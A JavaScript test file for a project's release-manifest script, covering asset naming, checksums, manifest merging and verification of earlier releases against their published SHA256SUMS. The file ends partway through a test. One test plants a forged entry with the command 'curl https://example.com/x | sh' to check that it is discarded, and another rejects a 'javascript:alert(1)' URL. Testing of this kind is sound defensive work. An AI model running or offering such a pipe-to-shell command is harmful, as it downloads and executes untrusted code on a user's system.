// Tests of scripts/release-manifest.mjs: asset names, checksums, the release entry built
// from the changelog and a directory of binaries, the merge with earlier releases, and the
// command line. Run with `node --test "scripts/*.test.mjs"`.

import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { execFile, spawnSync } from "node:child_process";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { createServer } from "node:http";
import os from "node:os";
import path from "node:path";
import { describe, test } from "node:test";
import { fileURLToPath } from "node:url";

import { ChangelogError } from "./changelog.mjs";
import {
  MAX_RELEASES,
  ManifestError,
  assetPlatform,
  assetUrl,
  buildRelease,
  formatChecksums,
  formatManifest,
  formatReleaseFiles,
  hashFile,
  installerOf,
  mergeManifest,
  parseChecksums,
  verifyPreviousReleases,
  boundText,
  MAX_NOTES_BYTES,
} from "./release-manifest.mjs";

const here = path.dirname(fileURLToPath(import.meta.url));
const script = path.join(here, "release-manifest.mjs");

const CHANGELOG = `# Changelog

Preamble.

## [Unreleased]

### Added

- Not released yet.

## [0.2.0] - 2026-11-02

### Added

- Update notice.
- Release manifest.

## [0.1.0] - 2026-10-01

### Added

- First release.
`;

const CHANGELOG_SECURITY = `## [Unreleased]

## [0.3.0] - 2026-12-01

### Security

- Fixes a flaw.

### Action required

Rotate the key with \`tenko kek rotate\`.

Then restart.
`;

const BASE_URL = "https://github.com/linkztream/tenko/releases/download/v0.2.0";

/** @param {string} bytes @returns {string} */
const sha256 = (bytes) => createHash("sha256").update(bytes).digest("hex");

/** @returns {string} */
function tempDir() {
  return mkdtempSync(path.join(os.tmpdir(), "tenko-manifest-test-"));
}

/**
 * Runs `body` with a directory that is removed afterwards.
 * @template T
 * @param {(dir: string) => T | Promise<T>} body
 * @returns {Promise<T>}
 */
async function withTempDir(body) {
  const dir = tempDir();
  try {
    return await body(dir);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

/**
 * @param {string} dir
 * @param {Record<string, string>} files name to content
 */
function writeFiles(dir, files) {
  for (const [name, content] of Object.entries(files)) writeFileSync(path.join(dir, name), content);
}

describe("assetPlatform", () => {
  test("recognizes tenko-<version>-<platform> with and without .exe", () => {
    assert.equal(assetPlatform("tenko-0.2.0-linux-x86_64", "0.2.0"), "linux-x86_64");
    assert.equal(assetPlatform("tenko-0.2.0-linux-aarch64", "0.2.0"), "linux-aarch64");
    assert.equal(assetPlatform("tenko-0.2.0-windows-x86_64.exe", "0.2.0"), "windows-x86_64");
    assert.equal(assetPlatform("tenko-0.2.0-windows-x86_64", "0.2.0"), "windows-x86_64");
    assert.equal(assetPlatform("tenko-0.2.0-darwin-arm64", "0.2.0"), "darwin-arm64");
    assert.equal(assetPlatform("tenko-0.2.0-freebsd-x86_64", "0.2.0"), "freebsd-x86_64");
  });

  test("handles versions with a pre-release part and build metadata", () => {
    assert.equal(assetPlatform("tenko-0.2.0-rc.1-linux-x86_64", "0.2.0-rc.1"), "linux-x86_64");
    assert.equal(assetPlatform("tenko-1.0.0-beta.2+build.5-linux-x86_64", "1.0.0-beta.2+build.5"), "linux-x86_64");
    // The pre-release file does not belong to the plain version, and the other way round.
    assert.equal(assetPlatform("tenko-0.2.0-rc.1-linux-x86_64", "0.2.0"), null);
    assert.equal(assetPlatform("tenko-0.2.0-linux-x86_64", "0.2.0-rc.1"), null);
  });

  test("ignores everything else", () => {
    const ignored = [
      "SHA256SUMS",
      "releases.json",
      "README.txt",
      "tenko",
      "tenko-0.2.0",
      "tenko-0.2.0-",
      "tenko-0.2.0-linux",
      "tenko-0.2.0-linux-x86_64.sha256",
      "tenko-0.2.0-linux-x86_64.sig",
      "tenko-0.2.0-linux-x86_64.tar.gz",
      "tenko-0.2.0-linux-x86_64.exe.sig",
      "tenko-0.2.0-Linux-x86_64",
      "tenko-0.2.0-linux-x86-64",
      "tenko-0.2.0-linux-x86_64-musl",
      "tenko-0.1.0-linux-x86_64",
      "tenko-0.2.00-linux-x86_64",
      "tenko-0.2.0-.exe",
      "TENKO-0.2.0-linux-x86_64",
      "mytenko-0.2.0-linux-x86_64",
    ];
    for (const name of ignored) assert.equal(assetPlatform(name, "0.2.0"), null, name);
  });
});

describe("assetUrl", () => {
  test("joins with exactly one slash", () => {
    for (const base of [BASE_URL, `${BASE_URL}/`, `${BASE_URL}///`]) {
      assert.equal(assetUrl(base, "tenko-0.2.0-linux-x86_64"), `${BASE_URL}/tenko-0.2.0-linux-x86_64`);
    }
  });
});

describe("hashFile", () => {
  test("streams a file and reports SHA-256 and size", async () => {
    await withTempDir(async (dir) => {
      const empty = path.join(dir, "empty");
      writeFileSync(empty, "");
      assert.deepEqual(await hashFile(empty), { sha256: sha256(""), size: 0 });

      const abc = path.join(dir, "abc");
      writeFileSync(abc, "abc");
      assert.deepEqual(await hashFile(abc), {
        sha256: "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad",
        size: 3,
      });

      // Larger than one read chunk, so the hash is fed in several pieces.
      const big = Buffer.alloc(3 * 1024 * 1024 + 17);
      for (let i = 0; i < big.length; i += 1) big[i] = (i * 31 + 7) & 0xff;
      const bigFile = path.join(dir, "big");
      writeFileSync(bigFile, big);
      assert.deepEqual(await hashFile(bigFile), {
        sha256: createHash("sha256").update(big).digest("hex"),
        size: big.length,
      });
    });
  });

  test("rejects for a missing file", async () => {
    await assert.rejects(hashFile(path.join(os.tmpdir(), "tenko-no-such-file")), { code: "ENOENT" });
  });
});

describe("buildRelease", () => {
  test("builds the entry from the changelog section and the files", async () => {
    await withTempDir(async (dir) => {
      writeFiles(dir, {
        "tenko-0.2.0-linux-x86_64": "linux x86_64 binary",
        "tenko-0.2.0-linux-aarch64": "linux aarch64 binary",
        "tenko-0.2.0-windows-x86_64.exe": "windows binary",
        "tenko-0.1.0-linux-x86_64": "an older release",
        "SHA256SUMS": "old sums",
        "releases.json": "{}",
        "notes.md": "notes",
      });
      mkdirSync(path.join(dir, "tenko-0.2.0-linux-riscv64"));
      const { release, ignored } = await buildRelease({
        version: "0.2.0",
        changelogText: CHANGELOG,
        assetsDir: dir,
        baseUrl: BASE_URL,
        image: "ghcr.io/linkztream/tenko:0.2.0",
        format: 3,
      });
      assert.deepEqual(release, {
        version: "0.2.0",
        date: "2026-11-02",
        notes: "### Added\n\n- Update notice.\n- Release manifest.",
        security: false,
        requires_action: false,
        format: 3,
        image: "ghcr.io/linkztream/tenko:0.2.0",
        assets: [
          {
            platform: "linux-aarch64",
            name: "tenko-0.2.0-linux-aarch64",
            url: `${BASE_URL}/tenko-0.2.0-linux-aarch64`,
            sha256: sha256("linux aarch64 binary"),
            size: Buffer.byteLength("linux aarch64 binary"),
          },
          {
            platform: "linux-x86_64",
            name: "tenko-0.2.0-linux-x86_64",
            url: `${BASE_URL}/tenko-0.2.0-linux-x86_64`,
            sha256: sha256("linux x86_64 binary"),
            size: Buffer.byteLength("linux x86_64 binary"),
          },
          {
            platform: "windows-x86_64",
            name: "tenko-0.2.0-windows-x86_64.exe",
            url: `${BASE_URL}/tenko-0.2.0-windows-x86_64.exe`,
            sha256: sha256("windows binary"),
            size: Buffer.byteLength("windows binary"),
          },
        ],
      });
      assert.deepEqual(ignored.slice().sort(), ["SHA256SUMS", "notes.md", "releases.json", "tenko-0.1.0-linux-x86_64", "tenko-0.2.0-linux-riscv64"]);
      // The key order is the order of the documented schema.
      assert.deepEqual(Object.keys(release), ["version", "date", "notes", "security", "requires_action", "format", "image", "assets"]);
      assert.deepEqual(Object.keys(release.assets[0] ?? {}), ["platform", "name", "url", "sha256", "size"]);
      for (const a of release.assets) assert.match(a.sha256, /^[0-9a-f]{64}$/);
    });
  });

  test("omits action, format and image when they are not given", async () => {
    await withTempDir(async (dir) => {
      writeFiles(dir, { "tenko-0.2.0-linux-x86_64": "x" });
      const { release } = await buildRelease({ version: "0.2.0", changelogText: CHANGELOG, assetsDir: dir, baseUrl: BASE_URL });
      for (const key of ["action", "format", "image"]) assert.ok(!(key in release), key);
      assert.equal(release.security, false);
      assert.equal(release.requires_action, false);
    });
  });

  test("carries security and the action text of a release that requires one", async () => {
    await withTempDir(async (dir) => {
      writeFiles(dir, { "tenko-0.3.0-linux-x86_64": "x" });
      const { release } = await buildRelease({ version: "0.3.0", changelogText: CHANGELOG_SECURITY, assetsDir: dir, baseUrl: BASE_URL });
      assert.equal(release.security, true);
      assert.equal(release.requires_action, true);
      assert.equal(release.action, "Rotate the key with `tenko kek rotate`.\n\nThen restart.");
      assert.match(release.notes, /^### Security\n\n- Fixes a flaw\.\n\n### Action required\n/);
    });
  });

  test("accepts a pre-release version", async () => {
    await withTempDir(async (dir) => {
      writeFiles(dir, { "tenko-1.0.0-rc.1-linux-x86_64": "rc" });
      const text = "## [1.0.0-rc.1] - 2027-01-05\n\n- RC.\n";
      const { release } = await buildRelease({ version: "1.0.0-rc.1", changelogText: text, assetsDir: dir, baseUrl: `${BASE_URL}/` });
      assert.equal(release.version, "1.0.0-rc.1");
      assert.equal(release.assets[0]?.url, `${BASE_URL}/tenko-1.0.0-rc.1-linux-x86_64`);
    });
  });

  test("the Unreleased section is never released, and a missing section is an error", async () => {
    await withTempDir(async (dir) => {
      writeFiles(dir, { "tenko-0.9.0-linux-x86_64": "x" });
      const args = { changelogText: CHANGELOG, assetsDir: dir, baseUrl: BASE_URL };
      await assert.rejects(buildRelease({ ...args, version: "0.9.0" }), (e) => {
        assert.ok(e instanceof ManifestError);
        assert.match(e.message, /no section "## \[0\.9\.0\] - YYYY-MM-DD"/);
        assert.match(e.message, /Unreleased section is never released/);
        return true;
      });
      await assert.rejects(buildRelease({ ...args, version: "Unreleased" }), ManifestError);
      await assert.rejects(buildRelease({ ...args, version: "0.2.0-rc.1" }), /no section/);
    });
  });

  test("a changelog that does not parse is a ChangelogError", async () => {
    await withTempDir(async (dir) => {
      writeFiles(dir, { "tenko-0.2.0-linux-x86_64": "x" });
      await assert.rejects(
        buildRelease({ version: "0.2.0", changelogText: "## Nope\n", assetsDir: dir, baseUrl: BASE_URL }),
        ChangelogError,
      );
    });
  });

  test("refuses a version that is not SemVer", async () => {
    await withTempDir(async (dir) => {
      const args = { changelogText: CHANGELOG, assetsDir: dir, baseUrl: BASE_URL };
      for (const version of ["v0.2.0", "0.2", "latest", "", "0.2.0 ", `1.0.0-${"a".repeat(123)}`]) {
        await assert.rejects(buildRelease({ ...args, version }), /not a semantic version/, JSON.stringify(version));
      }
    });
  });

  test("refuses a base URL that is not http(s), a bad format and an empty image", async () => {
    await withTempDir(async (dir) => {
      writeFiles(dir, { "tenko-0.2.0-linux-x86_64": "x" });
      const args = { version: "0.2.0", changelogText: CHANGELOG, assetsDir: dir, baseUrl: BASE_URL };
      for (const baseUrl of ["", "releases", "ftp://example.com/x", "file:///tmp/x", "javascript:alert(1)"]) {
        await assert.rejects(buildRelease({ ...args, baseUrl }), /not an http\(s\) URL/, baseUrl);
      }
      for (const format of [0, -1, 1.5, Number.NaN, Number.POSITIVE_INFINITY]) {
        await assert.rejects(buildRelease({ ...args, format }), /--format must be a positive integer/, String(format));
      }
      await assert.rejects(buildRelease({ ...args, image: "" }), /--image must not be empty/);
    });
  });

  test("refuses a directory without an asset of the version", async () => {
    await withTempDir(async (dir) => {
      const args = { version: "0.2.0", changelogText: CHANGELOG, assetsDir: dir, baseUrl: BASE_URL };
      await assert.rejects(buildRelease(args), /no release asset for version 0\.2\.0.*found no files/);
      writeFiles(dir, { "tenko-0.1.0-linux-x86_64": "x", "README.txt": "y" });
      await assert.rejects(buildRelease(args), /found README\.txt, tenko-0\.1\.0-linux-x86_64/);
    });
  });

  test("refuses two assets for one platform", async () => {
    await withTempDir(async (dir) => {
      writeFiles(dir, { "tenko-0.2.0-windows-x86_64": "a", "tenko-0.2.0-windows-x86_64.exe": "b" });
      await assert.rejects(
        buildRelease({ version: "0.2.0", changelogText: CHANGELOG, assetsDir: dir, baseUrl: BASE_URL }),
        /two assets for platform windows-x86_64/,
      );
    });
  });

  test("a missing assets directory is an error", async () => {
    await assert.rejects(
      buildRelease({ version: "0.2.0", changelogText: CHANGELOG, assetsDir: path.join(os.tmpdir(), "tenko-no-such-dir"), baseUrl: BASE_URL }),
      { code: "ENOENT" },
    );
  });
});

describe("mergeManifest", () => {
  /**
   * @param {string} version
   * @param {Record<string, unknown>} [extra]
   */
  const release = (version, extra = {}) => ({
    version,
    date: "2026-01-01",
    notes: `Notes of ${version}`,
    security: false,
    requires_action: false,
    assets: [],
    ...extra,
  });
  /** @param {unknown[]} releases */
  const manifest = (releases) => ({ schema: 1, project: "tenko", releases });

  test("without a previous manifest the result has one release", () => {
    assert.deepEqual(mergeManifest(null, release("0.2.0")), manifest([release("0.2.0")]));
    assert.deepEqual(mergeManifest(undefined, release("0.2.0")), manifest([release("0.2.0")]));
  });

  test("keeps earlier releases and sorts newest first", () => {
    const previous = manifest([release("0.1.0"), release("0.3.0")]);
    const merged = mergeManifest(previous, release("0.2.0"));
    assert.deepEqual(
      merged.releases.map((r) => r.version),
      ["0.3.0", "0.2.0", "0.1.0"],
    );
    assert.deepEqual(Object.keys(merged), ["schema", "project", "releases"]);
  });

  test("sorts by SemVer precedence, not by text or by position", () => {
    const previous = manifest([release("0.9.0"), release("1.0.0-rc.2"), release("1.0.0"), release("0.10.0"), release("1.0.0-rc.10")]);
    const merged = mergeManifest(previous, release("1.0.0-beta.1"));
    assert.deepEqual(
      merged.releases.map((r) => r.version),
      ["1.0.0", "1.0.0-rc.10", "1.0.0-rc.2", "1.0.0-beta.1", "0.10.0", "0.9.0"],
    );
  });

  test("replaces an existing entry of the same version", () => {
    const previous = manifest([release("0.2.0", { notes: "old" }), release("0.1.0")]);
    const merged = mergeManifest(previous, release("0.2.0", { notes: "new", format: 2 }));
    assert.equal(merged.releases.length, 2);
    assert.equal(merged.releases[0]?.notes, "new");
    assert.equal(merged.releases[0]?.format, 2);
  });

  test("keeps the other releases unchanged, unknown fields included", () => {
    const old = release("0.1.0", { future_field: { a: 1 }, image: "ghcr.io/example/x:0.1.0" });
    const merged = mergeManifest(manifest([old]), release("0.2.0"));
    assert.deepEqual(merged.releases[1], old);
  });

  test("does not modify its inputs", () => {
    const previous = manifest([release("0.1.0")]);
    const copy = structuredClone(previous);
    const added = release("0.2.0");
    const addedCopy = structuredClone(added);
    mergeManifest(previous, added);
    assert.deepEqual(previous, copy);
    assert.deepEqual(added, addedCopy);
  });

  test("versions equal in precedence are ordered by their text, newest text first", () => {
    const merged = mergeManifest(manifest([release("1.0.0+a")]), release("1.0.0+b"));
    assert.deepEqual(
      merged.releases.map((r) => r.version),
      ["1.0.0+b", "1.0.0+a"],
    );
  });

  test("refuses a manifest of another schema or project, or a broken release", () => {
    const r = release("0.2.0");
    assert.throws(() => mergeManifest({ schema: 2, project: "tenko", releases: [] }, r), ManifestError);
    assert.throws(() => mergeManifest({ schema: 1, project: "other", releases: [] }, r), ManifestError);
    assert.throws(() => mergeManifest({ schema: 1, project: "tenko" }, r), ManifestError);
    assert.throws(() => mergeManifest({ schema: 1, project: "tenko", releases: {} }, r), ManifestError);
    assert.throws(() => mergeManifest(/** @type {any} */ ("text"), r), ManifestError);
    assert.throws(() => mergeManifest(manifest([{ notes: "no version" }]), r), /without a valid version/);
    assert.throws(() => mergeManifest(manifest([release("v0.1.0")]), r), /without a valid version/);
    assert.throws(() => mergeManifest(manifest([null]), r), ManifestError);
  });

  test("refuses a manifest with more than 1,000 releases", () => {
    assert.equal(MAX_RELEASES, 1000);
    const many = (/** @type {number} */ n) => Array.from({ length: n }, (_, i) => release(`1.${i}.0`));
    assert.equal(mergeManifest(manifest(many(999)), release("2.0.0")).releases.length, 1000);
    assert.throws(() => mergeManifest(manifest(many(1000)), release("2.0.0")), /1001 releases; the limit is 1000/);
    // Replacing an entry keeps the count.
    assert.equal(mergeManifest(manifest(many(1000)), release("1.5.0")).releases.length, 1000);
    assert.throws(() => mergeManifest(manifest(many(1001)), release("1.5.0")), ManifestError);
  });
});

// WP6.7: installer packages ------------------------------------------------------------

describe("installerOf", () => {
  test("recognizes the installer packages of the version", () => {
    assert.deepEqual(installerOf("tenko-0.2.0-windows-x86_64.msi", "0.2.0"), { kind: "msi", platform: "windows-x86_64" });
    assert.deepEqual(installerOf("tenko-0.2.0-rc.1-windows-x86_64.msi", "0.2.0-rc.1"), { kind: "msi", platform: "windows-x86_64" });
  });

  test("refuses everything else", () => {
    for (const name of [
      "tenko-0.2.0-windows-x86_64.exe",
      "tenko-0.2.0-windows-x86_64",
      "tenko-0.2.0-windows-x86_64.zip",
      "tenko-0.1.0-windows-x86_64.msi",
      "tenko-0.2.0-windows.msi",
      "tenko-0.2.0-Windows-x86_64.msi",
      "tenko-0.2.0-.msi",
      "tenko-0.2.0-windows-x86_64.constructor",
    ]) {
      assert.equal(installerOf(name, "0.2.0"), null, name);
    }
  });

  test("lists installers apart from the assets and in SHA256SUMS", async () => {
    await withTempDir(async (dir) => {
      writeFiles(dir, {
        "tenko-0.2.0-linux-x86_64": "linux binary",
        "tenko-0.2.0-windows-x86_64.exe": "windows binary",
        "tenko-0.2.0-windows-x86_64.msi": "windows installer",
      });
      const { release, ignored } = await buildRelease({ version: "0.2.0", changelogText: CHANGELOG, assetsDir: dir, baseUrl: BASE_URL });
      assert.deepEqual(ignored, []);
      assert.deepEqual(
        release.assets.map((a) => a.platform),
        ["linux-x86_64", "windows-x86_64"],
      );
      assert.deepEqual(release.installers, [
        {
          kind: "msi",
          platform: "windows-x86_64",
          name: "tenko-0.2.0-windows-x86_64.msi",
          url: `${BASE_URL}/tenko-0.2.0-windows-x86_64.msi`,
          sha256: sha256("windows installer"),
          size: Buffer.byteLength("windows installer"),
        },
      ]);
      assert.deepEqual(Object.keys(release).slice(-2), ["assets", "installers"]);
      const sums = formatChecksums(release).trimEnd().split("\n");
      assert.deepEqual(
        sums.map((line) => line.split("  ")[1]),
        ["tenko-0.2.0-linux-x86_64", "tenko-0.2.0-windows-x86_64.exe", "tenko-0.2.0-windows-x86_64.msi"],
      );
    });
  });

  test("a release without installers has no installers key", async () => {
    await withTempDir(async (dir) => {
      writeFiles(dir, { "tenko-0.2.0-linux-x86_64": "x" });
      const { release } = await buildRelease({ version: "0.2.0", changelogText: CHANGELOG, assetsDir: dir, baseUrl: BASE_URL });
      assert.ok(!("installers" in release));
    });
  });

  test("an installer alone is not a release", async () => {
    await withTempDir(async (dir) => {
      writeFiles(dir, { "tenko-0.2.0-windows-x86_64.msi": "x" });
      await assert.rejects(
        buildRelease({ version: "0.2.0", changelogText: CHANGELOG, assetsDir: dir, baseUrl: BASE_URL }),
        /no release asset/,
      );
    });
  });
});

describe("formatManifest and formatChecksums", () => {
  test("pretty JSON with two spaces and a trailing newline", () => {
    const text = formatManifest({ schema: 1, project: "tenko", releases: [] });
    assert.equal(text, '{\n  "schema": 1,\n  "project": "tenko",\n  "releases": []\n}\n');
  });

  test("the checksum file is in the sha256sum format, sorted by name", () => {
    const hex = (/** @type {string} */ c) => c.repeat(64);
    const text = formatChecksums({
      version: "0.2.0",
      date: "2026-11-02",
      notes: "",
      security: false,
      requires_action: false,
      assets: [
        { platform: "windows-x86_64", name: "tenko-0.2.0-windows-x86_64.exe", url: "u", sha256: hex("b"), size: 2 },
        { platform: "linux-x86_64", name: "tenko-0.2.0-linux-x86_64", url: "u", sha256: hex("a"), size: 1 },
      ],
    });
    assert.equal(text, `${hex("a")}  tenko-0.2.0-linux-x86_64\n${hex("b")}  tenko-0.2.0-windows-x86_64.exe\n`);
  });
});

describe("formatReleaseFiles", () => {
  const hex = (/** @type {string} */ c) => c.repeat(64);
  const release = {
    version: "0.2.0",
    date: "2026-11-02",
    notes: "",
    security: false,
    requires_action: false,
    assets: [{ platform: "linux-x86_64", name: "tenko-0.2.0-linux-x86_64", url: "u", sha256: hex("a"), size: 1 }],
    installers: [{ kind: "msi", platform: "windows-x86_64", name: "tenko-0.2.0-windows-x86_64.msi", url: "u", sha256: hex("c"), size: 3 }],
  };

  test("lists the manifest itself in the checksum file, by the digest of the text it returns", () => {
    const manifest = { schema: 1, project: "tenko", releases: [release] };
    const files = formatReleaseFiles(manifest, release);
    assert.equal(files.manifest, formatManifest(manifest));
    assert.equal(
      files.checksums,
      `${sha256(files.manifest)}  releases.json\n${hex("a")}  tenko-0.2.0-linux-x86_64\n${hex("c")}  tenko-0.2.0-windows-x86_64.msi\n`,
    );
  });

  test("the digest is of the final manifest, earlier releases included", () => {
    const old = { ...release, version: "0.1.0", notes: "old" };
    const one = formatReleaseFiles({ schema: 1, project: "tenko", releases: [release] }, release);
    const two = formatReleaseFiles({ schema: 1, project: "tenko", releases: [release, old] }, release);
    assert.notEqual(one.manifest, two.manifest);
    const line = (/** @type {{ checksums: string }} */ f) => f.checksums.split("\n").find((l) => l.endsWith("  releases.json"));
    assert.equal(line(one), `${sha256(one.manifest)}  releases.json`);
    assert.equal(line(two), `${sha256(two.manifest)}  releases.json`);
    assert.notEqual(line(one), line(two));
  });

  test("names the manifest file as it is written", () => {
    const files = formatReleaseFiles({ schema: 1, project: "tenko", releases: [release] }, release, "manifest.json");
    assert.match(files.checksums, /^[0-9a-f]{64}  manifest\.json$/m);
    assert.ok(!files.checksums.includes("releases.json"));
  });
});

describe("parseChecksums", () => {
  test("reads the sha256sum format, text and binary mode, and ignores the rest", () => {
    const hex = (/** @type {string} */ c) => c.repeat(64);
    const sums = parseChecksums(`${hex("a")}  install.sh\n${hex("B")} *tenko-0.1.0-linux-x86_64\n\nnot a line\n${hex("c")}  a name with spaces\n`);
    assert.deepEqual(
      [...sums.entries()],
      [
        ["install.sh", hex("a")],
        ["tenko-0.1.0-linux-x86_64", hex("b")],
        ["a name with spaces", hex("c")],
      ],
    );
  });
});

// The check of the earlier releases of a previous manifest against their own SHA256SUMS.
describe("verifyPreviousReleases", () => {
  const DOWNLOAD_URL = "https://github.com/linkztream/tenko/releases/download";
  const hex = (/** @type {string} */ c) => c.repeat(64);
  /**
   * @param {string} version
   * @param {Record<string, unknown>} [extra]
   */
  const entry = (version, extra = {}) => ({
    version,
    date: "2026-01-01",
    notes: `### Fixed\n\n- Notes of ${version}.`,
    security: false,
    requires_action: false,
    assets: [
      { platform: "linux-x86_64", name: `tenko-${version}-linux-x86_64`, url: `${DOWNLOAD_URL}/v${version}/tenko-${version}-linux-x86_64`, sha256: hex("a"), size: 1 },
      { platform: "windows-x86_64", name: `tenko-${version}-windows-x86_64.exe`, url: `${DOWNLOAD_URL}/v${version}/tenko-${version}-windows-x86_64.exe`, sha256: hex("b"), size: 2 },
    ],
    installers: [
      { kind: "msi", platform: "windows-x86_64", name: `tenko-${version}-windows-x86_64.msi`, url: `${DOWNLOAD_URL}/v${version}/tenko-${version}-windows-x86_64.msi`, sha256: hex("c"), size: 3 },
    ],
    ...extra,
  });
  /** The SHA256SUMS a release with the digests of `entry` published, with the installers and SBOMs around them. */
  const sumsOf = (/** @type {string} */ version) =>
    `${hex("9")}  install.sh\n${hex("a")}  tenko-${version}-linux-x86_64\n${hex("8")}  tenko-${version}-linux-x86_64.cdx.json\n${hex("b")}  tenko-${version}-windows-x86_64.exe\n${hex("c")}  tenko-${version}-windows-x86_64.msi\n`;
  /** @param {Record<string, { status: number, text: string }>} responses by URL */
  const fetcher = (responses) => {
    /** @type {string[]} */
    const requested = [];
    const fetchText = async (/** @type {string} */ url) => {
      requested.push(url);
      return responses[url] ?? { status: 404, text: "Not Found" };
    };
    return { fetchText, requested };
  };
  const manifest = (/** @type {unknown[]} */ releases) => ({ schema: 1, project: "tenko", releases });
  /** The changelog being released: a section for each version the tests name, dated as `entry`. */
  const changelogText = `# Changelog\n\n## [Unreleased]\n\n${["0.2.0", "0.1.0", "0.0.9", "0.0.8"]
    .map((v) => `## [${v}] - 2026-01-01\n\n### Fixed\n\n- Notes of ${v}.\n`)
    .join("\n")}`;
  const IMAGE = "ghcr.io/linkztream/tenko:0.2.0";
  /**
   * @param {(url: string) => Promise<{ status: number, text: string }>} fetchText
   * @param {Record<string, unknown>} [more]
   */
  const options = (fetchText, more = {}) => ({ downloadUrl: DOWNLOAD_URL, fetchText, changelogText, image: IMAGE, format: 3, ...more });

  test("keeps an entry whose digests are those of its release's SHA256SUMS, fetched by tag, with the fields of schema 1 only", async () => {
    const { fetchText, requested } = fetcher({ [`${DOWNLOAD_URL}/v0.1.0/SHA256SUMS`]: { status: 200, text: sumsOf("0.1.0") } });
    const previous = manifest([entry("0.1.0", { future_field: 1, format: 2, image: "ghcr.io/linkztream/tenko:0.1.0" })]);
    const copy = structuredClone(previous);
    const result = await verifyPreviousReleases(previous, options(fetchText));
    assert.deepEqual(result.previous, manifest([entry("0.1.0", { format: 2, image: "ghcr.io/linkztream/tenko:0.1.0" })]));
    assert.deepEqual(result.dropped, []);
    assert.deepEqual(requested, [`${DOWNLOAD_URL}/v0.1.0/SHA256SUMS`]);
    assert.deepEqual(previous, copy);
  });

  test("drops a planted entry whose digest is not the one its release published, with a warning", async () => {
    const planted = entry("0.1.0");
    planted.assets[0] = { ...planted.assets[0], sha256: hex("f") };
    const { fetchText } = fetcher({
      [`${DOWNLOAD_URL}/v0.1.0/SHA256SUMS`]: { status: 200, text: sumsOf("0.1.0") },
      [`${DOWNLOAD_URL}/v0.0.9/SHA256SUMS`]: { status: 200, text: sumsOf("0.0.9") },
    });
    const result = await verifyPreviousReleases(manifest([planted, entry("0.0.9")]), options(fetchText));
    assert.deepEqual(result.previous.releases.map((r) => r.version), ["0.0.9"]);
    assert.equal(result.dropped.length, 1);
    assert.equal(result.dropped[0]?.version, "0.1.0");
    assert.match(result.dropped[0]?.reason ?? "", /tenko-0\.1\.0-linux-x86_64/);
  });

  test("drops an entry with a file its release never published, an installer included", async () => {
    const extra = entry("0.1.0");
    extra.installers = [{ ...extra.installers[0], name: "tenko-0.1.0-linux-x86_64.deb", kind: "deb", url: `${DOWNLOAD_URL}/v0.1.0/tenko-0.1.0-linux-x86_64.deb` }];
    const { fetchText } = fetcher({ [`${DOWNLOAD_URL}/v0.1.0/SHA256SUMS`]: { status: 200, text: sumsOf("0.1.0") } });
    const result = await verifyPreviousReleases(manifest([extra]), options(fetchText));
    assert.deepEqual(result.previous.releases, []);
    assert.match(result.dropped[0]?.reason ?? "", /tenko-0\.1\.0-linux-x86_64\.deb/);
  });

  test("drops an entry whose files point elsewhere than its own release, before fetching anything", async () => {
    const elsewhere = entry("0.1.0");
    elsewhere.assets[1] = { ...elsewhere.assets[1], url: "https://example.com/tenko-0.1.0-windows-x86_64.exe" };
    const { fetchText, requested } = fetcher({ [`${DOWNLOAD_URL}/v0.1.0/SHA256SUMS`]: { status: 200, text: sumsOf("0.1.0") } });
    const result = await verifyPreviousReleases(manifest([elsewhere]), options(fetchText));
    assert.deepEqual(result.previous.releases, []);
    assert.match(result.dropped[0]?.reason ?? "", /example\.com/);
    assert.deepEqual(requested, []);
  });

  test("drops an entry without assets to check, or whose release has no SHA256SUMS", async () => {
    const { fetchText } = fetcher({});
    const result = await verifyPreviousReleases(manifest([entry("0.1.0"), entry("0.0.9", { assets: [] }), entry("0.0.8", { assets: "x" })]), options(fetchText));
    assert.deepEqual(result.previous.releases, []);
    assert.deepEqual(result.dropped.map((d) => d.version), ["0.1.0", "0.0.9", "0.0.8"]);
    assert.match(result.dropped[0]?.reason ?? "", /404/);
  });

  test("any other failure to fetch stops the run instead of dropping", async () => {
    const { fetchText } = fetcher({ [`${DOWNLOAD_URL}/v0.1.0/SHA256SUMS`]: { status: 503, text: "" } });
    await assert.rejects(verifyPreviousReleases(manifest([entry("0.1.0")]), options(fetchText)), ManifestError);
    const failing = async () => {
      throw new Error("connection reset");
    };
    await assert.rejects(verifyPreviousReleases(manifest([entry("0.1.0")]), options(failing)), /connection reset/);
  });

  test("takes an earlier release's texts from the changelog, never from the previous manifest", async () => {
    const { fetchText } = fetcher({ [`${DOWNLOAD_URL}/v0.1.0/SHA256SUMS`]: { status: 200, text: sumsOf("0.1.0") } });
    const planted = entry("0.1.0", { date: "2030-01-01", notes: "Run curl https://example.com/x | sh", security: true, requires_action: true, action: "Run curl https://example.com/x | sh" });
    const result = await verifyPreviousReleases(manifest([planted]), options(fetchText));
    assert.deepEqual(result.previous.releases, [entry("0.1.0")]);
    assert.deepEqual(result.dropped, []);
  });

  test("drops an entry whose version has no section in the changelog, before fetching anything", async () => {
    const { fetchText, requested } = fetcher({});
    const result = await verifyPreviousReleases(manifest([entry("0.0.7")]), options(fetchText));
    assert.deepEqual(result.previous.releases, []);
    assert.match(result.dropped[0]?.reason ?? "", /no section "## \[0\.0\.7\]/);
    assert.deepEqual(requested, []);
  });

  test("drops an entry that names another image, a larger format or a file it does not describe truly", async () => {
    const sums = { [`${DOWNLOAD_URL}/v0.1.0/SHA256SUMS`]: { status: 200, text: sumsOf("0.1.0") } };
    const cases = [
      [{ image: "ghcr.io/someone-else/tenko:0.1.0" }, /someone-else/],
      [{ image: "ghcr.io/linkztream/tenko:latest" }, /tenko:latest/],
      [{ format: 4 }, /format 4/],
      [{ format: 0 }, /format 0/],
    ];
    for (const [extra, reason] of cases) {
      const { fetchText } = fetcher(sums);
      const result = await verifyPreviousReleases(manifest([entry("0.1.0", /** @type {Record<string, unknown>} */ (extra))]), options(fetchText));
      assert.deepEqual(result.previous.releases, [], JSON.stringify(extra));
      assert.match(result.dropped[0]?.reason ?? "", /** @type {RegExp} */ (reason));
    }
    const wrongPlatform = entry("0.1.0");
    wrongPlatform.assets[0] = { ...wrongPlatform.assets[0], platform: "windows-x86_64" };
    const wrongKind = entry("0.1.0");
    wrongKind.installers[0] = { ...wrongKind.installers[0], kind: "exe" };
    const badDigest = entry("0.1.0");
    badDigest.assets[0] = { ...badDigest.assets[0], sha256: hex("A") };
